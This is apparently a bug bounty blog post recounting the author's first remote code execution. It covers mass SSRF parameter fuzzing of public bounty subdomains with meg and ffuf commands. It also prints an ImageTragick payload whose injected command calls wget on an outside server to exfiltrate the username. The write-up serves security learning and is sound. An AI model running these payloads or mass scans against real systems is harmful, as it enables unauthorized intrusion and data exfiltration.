---
title: "My first RCE: a tale of good ideas and good friends"
layout: post
categories:
  - hacking
tags:
  - hacking
---

## Summary 
Through the help of two friends, some bash tricks, the use of Tomnomnom's tool `meg`, and a service vulnerable to [ImageTragick](https://imagetragick.com/), I found my first RCE (and my first critical!) within the first two months of bug bounty hunting.

## Good friends and good ideas
I have always found value in surrounding myself with people I can learn from. In my professional work life, that's choosing to be around the most talented team member when possible. 

When I got into bug bounty, I immediately followed people like [@nahamsec](https://twitter.com/NahamSec), [@zseano](https://twitter.com/zseano), and [@stök](https://twitter.com/stokfredrik). They are very talented and get a lot of questions so I knew I needed to find other sources of help as well. Ben (@nahamsec) started a discord. HackerOne also has a discord. I met [@healthyoutlet](https://twitter.com/healthyoutlet) on one of those discords and we've been friends ever since. We're constantly bouncing ideas off each other. One day I told him it would be awesome to use [@tomnomnom](https://twitter.com/TomNomNom)'s `[meg](https://github.com/tomnomnom/meg)` tool to hit ALL public bounty subdomains with different high-signal payloads and then grepping for signs that it was vulnerable. Like most hackers, he's a doer so he immediately pulled down the github repo of all public programs (https://github.com/arkadiyt/bounty-targets-data), found the domains for the wildcards with [findomain](https://github.com/Edu4rdSHL/findomain), and sent me the list. 

<iframe src="https://giphy.com/embed/oYtVHSxngR3lC" width="480" height="347" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>

It was around 300,000 subdomains and >600,000 hosts because almost all were running on both port 80 and 443. 

We tried lots of different payloads:
* CRLF via %0d%0a
* Path traversal
* Known sensitive paths
* etc.

The idea that resulted in this write-up (and therefore, my first critical!) was parameter fuzzing. I had the idea to search for SSRF via stuffing a bunch of parametes into a request like:
```
https://example.com?url=myserver.com/url&file=myserver.com/file...
```

So I was telling [@michael1026](https://twitter.com/Michael1026H1) about my idea and he suggested a big list of parameters. Since Discord keeps good history, I dug it up for this post:
```
content, counturl, dest_url, document, domain, download, file, http, https, image, image_src, imageurl, include, media, Page, pageurl, page_url, picture, referrer, req, request, source, src, uri, url
```

I am pretty frugal, and I hadn't made any money from bug bounty at this point so I didn't have Burp Pro and the collaborator. So here was the steps I took:
1. Start a simple server on my VPS with `python3 -m http.server <random port number>`
2. Run `meg -c 100 -d 100 -s 777 "/?url=http://{my-server-ip}&file=http://{my-server-ip}&path=..." all_hosts.txt`. I used return code 777 because I didn't really want to save off any repsponses.  
3. Wait for a ping on my server.
4. ???
5. Profit!

Oh wait... maybe you already spotted the issue. I got a few pings on my simple http server, and I got really excited. But then I realized that I had no idea what parameter or host was vulnerabe.

## What I did to find the host and param name
I used the linux `split` command to cut the hosts into 100 files and wrote a for loop to iterate over them. I watched the simple server logs to see when I got a hit. Then I broke that flie into 100 files and did it again until I figured out the host. I did something similarly stupid to figure out the param name. It took a few hours when it shouldn't have, but it ended up being worth it :)

## What I should have done
1. I should have used [ffuf](https://github.com/ffuf/ffuf). It's an awesome and flexible fuzzer. Check it out if you haven't used it. 
2. I should have added the parameter name to the path. Then I would immediately know which parameter was vulnerable.
3. It would have been nice to include the domain in the path of the request so I would know which domain was vulnerable. This has to change PER request, which isn't trivial. I could have used some bash magic and curl. But nowadays, with the new pitchfork mode in ffuf, I could have requested the domain in the endpoint path pretty easily. 

Putting it all together, I should have done: 
```
ffuf -c -u HOST/?url=http://{my-server-ip}/DOMAIN/url&file=http://{my-server-ip}/DOMAIN/file -w hosts.txt:HOST -w domains.txt:DOMAIN -mode pitchfork -v 
```
Hosts.txt would contain hosts including the protocol. Domains would be the hosts WITHOUT the protocal lining up line-per-line with the hosts. You could easily generate this with @tomnomnom's tool `unfurl` via a command like this: `cat hosts.txt | unfurl -format %d | tee -a domains.txt`

## Wrapping up

The vulnerable host had the word image in the subdomain. So I hosted an image on my server and did `curl -v https://vulnerablehost.com/url=http://{my-server-ip}/image.jpg` and sure enough, the vulnerable host grabbed the image from my server and then delivered it to me. I was telling [@healthyoutlet](https://twitter.com/healthyoutlet) everything I was doing and asking for advice. He told me to check the downloaded image size. sure enough, it was completely different than the original. I opened up an image compare tool and there were lots of pixel differences. It was definitely being processed. So then [@healthyoutlet](https://twitter.com/healthyoutlet) mentions that it might be using [ImageTragick](https://imagetragick.com/) and to look into it. I quickly googled it, found the PoC's on github and modified it so that the code being executed was 
```
push graphic-context
viewbox 0 0 640 480 
fill 'url(https://127.0.0.0/oops.jpg"|wget http://{my-server-ip}/$(whoami)'
pop graphic-context
```
After a few seconds, I got a hit on my simple server at `/Serving`. Not root, but still proved RCE by the request AND the username of the user running the web server.

<iframe src="https://giphy.com/embed/8JVjMCr3OIAhO" width="480" height="178" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>

So, with imagetragick, an attacker can replace everything to the right of the pipe with whatever code they want.

## Take-aways

* Friends and collaboration are immensely valuable, especially when you're first starting. I wouldn't have found this without my friends helping.
* Creativity and huge data sets can lead to interesting findings.
* Don't assume old CVEs aren't still around. ImageTragick is a 2016 CVE and this was found on a well-known public bug bounty program.

I hope you enjoyed the write-up. I've got a few more from the last few months that might be interesting. 
